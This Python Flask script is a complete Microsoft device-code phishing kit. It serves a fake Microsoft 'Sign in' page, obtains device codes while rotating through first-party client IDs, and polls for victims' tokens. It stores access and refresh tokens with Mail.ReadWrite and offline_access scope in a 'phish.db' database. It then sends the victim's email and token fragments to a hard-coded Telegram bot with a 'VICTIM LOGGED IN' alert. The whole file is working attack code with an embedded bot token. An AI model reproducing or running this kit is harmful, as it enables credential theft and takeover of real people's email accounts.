import os
import time
import uuid
import json
import sqlite3
import threading
import requests
from flask import Flask, request, jsonify, render_template_string, redirect, url_for

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Microsoft Device Code Flow Constants
TENANT_ID = "common"
# Rotating Client IDs (Public Clients)
CLIENT_IDS = [
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "268761a2-03f3-40df-8a8b-c3db3fc24a24",  # OneDrive
    "30cad7ca-797c-4dba-81f6-8b01f6371013",  # Outlook Mobile
    "00b41c95-dab0-4487-9791-b9d2c32c80f2",  # Office 365 Management
    "eb539595-3fe1-474e-9c1d-feb3625d1be5",  # Teams
    "de1ecd2e-6b7e-425b-943d-b75b54b9b9d6",  # Windows Store
]

SCOPE = "openid profile offline_access https://outlook.office.com/Mail.ReadWrite https://graph.microsoft.com/User.Read"

DB_PATH = "/tmp/phish.db"

app = Flask(__name__)

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        client_id TEXT,
        status TEXT DEFAULT 'PENDING',
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        email TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Initialize DB on startup
init_db()

# --- HELPER FUNCTIONS ---

def send_telegram_message(text):
    """Sends a message to Telegram and logs any errors."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        resp = requests.post(url, json=payload, timeout=10)
        if resp.status_code == 200:
            print(f"[TELEGRAM] Message sent successfully.")
        else:
            print(f"[TELEGRAM ERROR] Status: {resp.status_code}, Response: {resp.text}")
    except Exception as e:
        print(f"[TELEGRAM EXCEPTION] Failed to send message: {str(e)}")

def poll_device_code(session_id, client_id, device_code):
    """Background thread to poll for token completion."""
    token_url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
    
    while True:
        time.sleep(5) # Poll every 5 seconds
        
        # Check if session is already completed in DB
        conn = get_db()
        row = conn.execute("SELECT status FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
        conn.close()
        
        if row and row['status'] == 'COMPLETED':
            break
            
        if row and row['status'] == 'FAILED':
            break

        payload = {
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "device_code": device_code,
            "client_id": client_id
        }
        
        try:
            resp = requests.post(token_url, data=payload, timeout=10)
            data = resp.json()
            
            if resp.status_code == 200:
                # Success!
                access_token = data.get("access_token")
                refresh_token = data.get("refresh_token")
                id_token = data.get("id_token")
                
                # Extract Email from ID Token
                email = "Unknown"
                if id_token:
                    try:
                        parts = id_token.split('.')
                        if len(parts) == 3:
                            payload_json = json.loads(base64_decode(parts[1]))
                            email = payload_json.get("preferred_username", "Unknown")
                    except:
                        pass

                # Update DB
                conn = get_db()
                conn.execute("""
                    UPDATE sessions 
                    SET status = 'COMPLETED', access_token = ?, refresh_token = ?, id_token = ?, email = ?
                    WHERE session_id = ?
                """, (access_token, refresh_token, id_token, email, session_id))
                conn.commit()
                conn.close()
                
                # Send Telegram Notification
                msg = (
                    f"🎯 <b>VICTIM LOGGED IN</b>\n"
                    f"👤 <b>Email:</b> <code>{email}</code>\n"
                    f"🔑 <b>Access Token:</b> <code>{access_token[:20]}...</code>\n"
                    f"🔄 <b>Refresh Token:</b> <code>{refresh_token[:20]}...</code>\n"
                    f"🆔 <b>ID Token:</b> <code>{id_token[:20]}...</code>"
                )
                send_telegram_message(msg)
                break
                
            elif data.get("error") == "authorization_pending":
                continue # Keep polling
            elif data.get("error") == "slow_down":
                time.sleep(5) # Wait extra
            else:
                # Other errors (expired, etc)
                print(f"[POLL ERROR] Session {session_id}: {data.get('error_description')}")
                conn = get_db()
                conn.execute("UPDATE sessions SET status = 'FAILED' WHERE session_id = ?", (session_id,))
                conn.commit()
                conn.close()
                break
                
        except Exception as e:
            print(f"[POLL EXCEPTION] Session {session_id}: {str(e)}")
            continue

def base64_decode(s):
    import base64
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s).decode('utf-8')

# --- ROUTES ---

@app.route('/')
def index():
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body { font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 2px; }
        .logo { width: 108px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; }
        input { width: 100%; padding: 6px 10px; border: 1px solid #8a8886; border-radius: 2px; font-size: 15px; margin-bottom: 16px; box-sizing: border-box; }
        input:focus { border-color: #0067b8; outline: none; }
        button { background-color: #0067b8; color: white; border: none; padding: 8px 32px; font-size: 15px; cursor: pointer; border-radius: 2px; float: right; }
        button:hover { background-color: #005da6; }
        .footer { margin-top: 40px; font-size: 12px; color: #666; clear: both; }
        .code-display { font-size: 32px; letter-spacing: 4px; font-weight: bold; color: #1b1b1b; margin: 20px 0; text-align: center; background: #f3f2f1; padding: 10px; border-radius: 4px; }
        .instruction { font-size: 15px; color: #1b1b1b; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_5bc9089d.svg" class="logo" alt="Microsoft">
        <h1>Sign in</h1>
        <p class="instruction">To sign in, enter the code shown below at <a href="https://microsoft.com/devicelogin" target="_blank">microsoft.com/devicelogin</a></p>
        
        <div id="loading">Generating secure session...</div>
        
        <div id="content" style="display:none;">
            <div class="code-display" id="userCode">LOADING...</div>
            <button onclick="copyAndRedirect()">Copy Code & Sign In</button>
        </div>
        
        <div class="footer">
            No account? Create one! | Can’t access your account?
        </div>
    </div>

    <script>
        let sessionData = null;

        async function initSession() {
            try {
                const response = await fetch('/create-session');
                sessionData = await response.json();
                
                document.getElementById('loading').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                document.getElementById('userCode').innerText = sessionData.user_code;
                
                // Start polling status
                pollStatus();
            } catch (error) {
                document.getElementById('loading').innerText = "Error connecting to server. Please refresh.";
            }
        }

        function copyAndRedirect() {
            navigator.clipboard.writeText(sessionData.user_code).then(() => {
                window.location.href = sessionData.verification_uri;
            }).catch(err => {
                console.error('Failed to copy: ', err);
                window.location.href = sessionData.verification_uri;
            });
        }

        function pollStatus() {
            setInterval(async () => {
                try {
                    const res = await fetch('/status/' + sessionData.session_id);
                    const data = await res.json();
                    if (data.status === 'COMPLETED') {
                        document.querySelector('.container').innerHTML = '<h1>Success</h1><p>You have been signed in. You can close this window.</p>';
                    } else if (data.status === 'FAILED') {
                        document.querySelector('.container').innerHTML = '<h1>Error</h1><p>Session expired or failed. Please refresh.</p>';
                    }
                } catch (e) { console.error(e); }
            }, 3000);
        }

        window.onload = initSession;
    </script>
</body>
</html>
    ''')

@app.route('/create-session')
def create_session():
    session_id = str(uuid.uuid4())
    
    # Try each client ID until one works
    selected_client_id = None
    device_code_resp = None
    
    for cid in CLIENT_IDS:
        url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
        payload = {
            "client_id": cid,
            "scope": SCOPE
        }
        try:
            resp = requests.post(url, data=payload, timeout=10)
            if resp.status_code == 200:
                selected_client_id = cid
                device_code_resp = resp.json()
                print(f"[FLOW OK] client={cid}")
                break
            else:
                print(f"[FLOW FAIL] client={cid} status={resp.status_code}")
        except Exception as e:
            print(f"[FLOW EXCEPT] client={cid} error={str(e)}")

    if not selected_client_id:
        return jsonify({"error": "Service unavailable"}), 503

    device_code = device_code_resp['device_code']
    user_code = device_code_resp['user_code']
    verification_uri = device_code_resp['verification_uri']

    conn = get_db()
    conn.execute("INSERT INTO sessions (session_id, device_code, user_code, verification_uri, client_id) VALUES (?, ?, ?, ?, ?)",
                 (session_id, device_code, user_code, verification_uri, selected_client_id))
    conn.commit()
    conn.close()

    # Start polling thread
    t = threading.Thread(target=poll_device_code, args=(session_id, selected_client_id, device_code))
    t.daemon = True
    t.start()

    return jsonify({
        "session_id": session_id,
        "user_code": user_code,
        "verification_uri": verification_uri
    })

@app.route('/status/<session_id>')
def status(session_id):
    conn = get_db()
    row = conn.execute("SELECT status FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
    conn.close()
    
    if row:
        return jsonify({"status": row['status']})
    return jsonify({"status": "NOT_FOUND"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=False)
